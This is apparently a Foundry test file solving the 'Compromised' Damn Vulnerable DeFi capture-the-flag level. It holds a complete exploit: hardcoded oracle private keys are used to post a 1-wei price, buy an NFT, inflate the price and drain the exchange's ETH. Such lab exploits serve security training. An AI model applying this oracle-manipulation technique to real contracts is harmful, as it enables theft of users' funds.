// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";

import {CompromisedAttack} from "../../../src/Contracts/compromised/CompromisedAttack.sol";

contract Compromised is Test {
    uint256 internal constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 internal constant INITIAL_NFT_PRICE = 999e18;

    Exchange internal exchange;
    TrustfulOracle internal trustfulOracle;
    TrustfulOracleInitializer internal trustfulOracleInitializer;
    DamnValuableNFT internal damnValuableNFT;
    address payable internal attacker;

    CompromisedAttack internal compromisedAttack;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;// Compromised(i can use this source in the exploit)
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c; // Compromised (i can also use this addres in the exploit)
        // They could have used utils but did not in this case. it's done the same way.
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint8 i = 0; i < arrLen;) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
            unchecked {
                ++i;
            }
        }

        string[] memory symbols = new string[](3);
        for (uint8 i = 0; i < arrLen;) {
            symbols[i] = "DVNFT";
            unchecked {
                ++i;
            }
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint8 i = 0; i < arrLen;) {
            initialPrices[i] = INITIAL_NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        damnValuableNFT = exchange.token();

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        // 1. Check median prices should be 999ETH
        uint256 medianPrice = trustfulOracle.getMedianPrice("DVNFT");
        console2.log("The median price now is", medianPrice);

        // 2. Post faulty price for compromised oracle 1 
        uint256 privKeyE92 = 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9;
        address key0xE92 = vm.addr(privKeyE92);
        vm.prank(key0xE92);
        trustfulOracle.postPrice("DVNFT", 1);

        // 3. Post faulty price for compromised oracle 2
        uint256 privKey81A = 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48;
        address key0x81A = vm.addr(privKey81A);
        vm.prank(key0x81A);
        trustfulOracle.postPrice("DVNFT", 1);

        //4. Check that the median price is now 1 wei 
        medianPrice = trustfulOracle.getMedianPrice("DVNFT");
        console2.log("The new median price is: ", medianPrice);

        //5. initialize new attack contract
        compromisedAttack = new CompromisedAttack(address(exchange), address(attacker), address(damnValuableNFT));

        //6. initiate attack by buying nft at 1 wei 
        vm.prank(attacker);
        compromisedAttack.buyDiscountedNFT{value: 1 wei}();

        //7. change the price of nft to 9990ETH to drain the Exchange 
        vm.prank(key0xE92);
        trustfulOracle.postPrice("DVNFT", 9990e18 + 1);

        vm.prank(key0x81A);
        trustfulOracle.postPrice("DVNFT", 9990e18 + 1);

        // 8. finish attack by selling nft
        vm.prank(attacker);
        compromisedAttack.cashOut();

        vm.prank(attacker);
        compromisedAttack.withdraw();

       // 9. Change the oracle price back to normal
       vm.prank(key0xE92);
        trustfulOracle.postPrice("DVNFT", 999e18);

        vm.prank(key0x81A);
        trustfulOracle.postPrice("DVNFT", 999e18);

        

    
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(damnValuableNFT.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }

     receive() payable external {}
}
